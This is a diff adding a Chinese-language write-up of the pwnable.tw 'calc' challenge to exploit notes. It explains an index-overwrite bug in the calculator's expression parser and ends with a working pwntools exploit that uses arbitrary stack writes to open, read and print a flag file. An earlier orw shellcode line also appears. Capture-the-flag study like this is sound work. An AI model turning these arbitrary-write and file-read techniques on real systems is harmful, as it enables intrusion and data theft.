@@ -40,3 +40,127 @@ p=remote("chall.pwnable.tw",10001)
 p.sendlineafter(":",asm(shellcraft.open("/home/orw/flag")+shellcraft.read(3, 0x0804a060+300, 0x50)+shellcraft.write(1, 0x0804a060+300, 0x50)))
 p.interactive()
 ```
+
+## calc
+
+止 步 于 此
+
+最后还是没能靠自己发现漏洞的完全体，偷瞄了一眼 https://medium.com/@sagidana/calc-pwnable-tw-ef5450f40253 。没想到漏洞竟然是我第一眼看到的内容。然而我卡在了另一个更明显的溢出漏洞，完全忘记了这个我第一眼注意到的内容……
+
+错误的漏洞如下（以下均为`parse_expr`里的内容）：
+
+在switch-case处，`%`,`*`和`/`对应的case里有这么一段：
+```c
+          if ((history_symbols[last_symbol_idx] == '+') || (history_symbols[last_symbol_idx] == '-')
+             ) {
+            history_symbols[last_symbol_idx + 1] = *(char *)((int)expr + index);
+            last_symbol_idx = last_symbol_idx + 1;
+          }
+```
+搜索`last_symbol_idx`的引用会发现，这玩意的值只会增加，不会减少。而`history_symbols`距离栈顶只有`0x74`个字节。交替传入`+`号和`*`号即可溢出，比如`+1*1+1*1...`。但这个漏洞无法利用，原因：
+- 题目有canary，这样的溢出必然会修改canary
+- expr的内容在`get_expr`里有限制，写不了什么有用的东西
+
+正确的漏洞如下：
+
+注意开头有这么一段：
+```c
+    if (9 < (int)*(char *)((int)expr + index) - 0x30U) {
+      __n = (int)expr + (index - (int)sub_expr);
+      __s1 = (char *)malloc(__n + 1);
+      memcpy(__s1,sub_expr,__n);
+      __s1[__n] = '\0';
+      operand = strcmp(__s1,"0");
+      if (operand == 0) {
+        puts("prevent division by zero");
+        fflush((FILE *)stdout);
+        uVar2 = 0;
+        goto ret;
+      }
+      operand = atoi(__s1);
+      //后面意识到这可能是作者的提示。前面已经检查了operand不能是0，这里却还在检查operand是否为0。那么可能存在一种情况，使operand不是0，但atoi的结果是0
+      //当然有点马后炮了……
+      if (0 < operand) {
+                    /* 取出并更新当前栈上的索引: result_stack[0] */
+        iVar1 = *result_stack;
+        *result_stack = iVar1 + 1;
+        result_stack[iVar1 + 1] = operand;
+      }
+```
+如果用户输入的expr是`+1234`，这里`__s1`的内容就是`+`。这玩意atoi的结果是0，因此result_stack的索引不会更新。expr的末尾是null字符，那么null字符会进入这个if分支吗？答案是会。我光看ghidra的伪代码了，看到`(int)`就以为是有符号比较，那`0-0x30`是负数，自然就不会进入这个if分支。结果它的汇编其实是`cmp eax,9;jbe ...`。jbe用于无符号数比较，有符号的应该是jle。总之，1234会被转为数字，存入result_stack中
+
+接下来会走到default case，执行eval里的这一段：
+```c
+  if (symbol == '+') {
+    result_stack[*result_stack + -1] =
+         result_stack[*result_stack + -1] + result_stack[*result_stack];
+  }
+```
+此时`*result_stack`的值是1，那么这段就等于`result_stack[0] = result_stack[0] + result_stack[1]`。问题来了，`result_stack[0]`应该是栈的索引，现在却被用户修改了。回到calc，这一段代码就在引用索引：
+```c
+//ghidra的迷之定义
+  int local_5a4;
+  undefined4 auStack_5a0 [100];
+//...
+    iVar1 = parse_expr(expr,&local_5a4);
+    if (iVar1 != 0) {
+      printf("%d\n",auStack_5a0[local_5a4 + -1]);
+      fflush((FILE *)stdout);
+    }
+```
+于是我们有了个相对于`auStack_5a0`的任意地址读。任意地址写其实也有了。还是这一段：
+```c
+if (0 < operand) {
+        iVar1 = *result_stack;
+        *result_stack = iVar1 + 1;
+        result_stack[iVar1 + 1] = operand;
+      }
+```
+假如我们输入`+1234+5678`，在第二个`+`处会把栈索引修改为`1234`;处理5678时便会执行`result_stack[1234+1] = 5678`；紧接着eval里又会执行`result_stack[1234] = result_stack[1234] + result_stack[1235]`。至此一切就很明了了
+```py
+from pwn import *
+exe=ELF('./calc')
+p=remote("chall.pwnable.tw",10100)
+p.recvline()
+START_OFF=361
+bss=0x80eb400
+def read_offset(offset):
+    p.sendline(f"+{START_OFF+offset}")
+    return int(p.recvline(keepends=False))
+def write_offset(offset,value):
+    original=read_offset(offset)
+    if value>original:
+        p.sendline(f"+{START_OFF+offset}+{value-original}")
+    else:
+        p.sendline(f"+{START_OFF+offset}-{original-value}")
+    p.recvline()
+filename="/home/calc/flag"
+write_offset(0,exe.sym['read'])
+write_offset(1,exe.sym['calc'])
+write_offset(2,0)
+write_offset(3,bss)
+write_offset(4,len(filename))
+p.sendline()
+p.send(filename)
+write_offset(0,exe.sym['open'])
+write_offset(1,exe.sym['calc'])
+write_offset(2,bss)
+write_offset(3,0)
+p.sendline()
+write_offset(0,exe.sym['read'])
+write_offset(1,exe.sym['calc'])
+write_offset(2,3)
+write_offset(3,bss+0x100)
+write_offset(4,0x50)
+p.sendline()
+write_offset(0,exe.sym['write'])
+write_offset(1,exe.sym['calc'])
+write_offset(2,1)
+write_offset(3,bss+0x100)
+write_offset(4,0x50)
+p.sendline()
+p.interactive()
+```
+不过我没想到怎么getshell（binary是静态链接，而且没找到system和execve等函数），于是用我的古法orw
+
+悲伤的地方在于，我一直在测试`+x+x`类型的payload，但我的x太小了，导致我一直忽略了这块内容……就差一点我就能自己写出来了……下一次遇见奇怪的地方一定要测试透了再转到下一个内容啊……
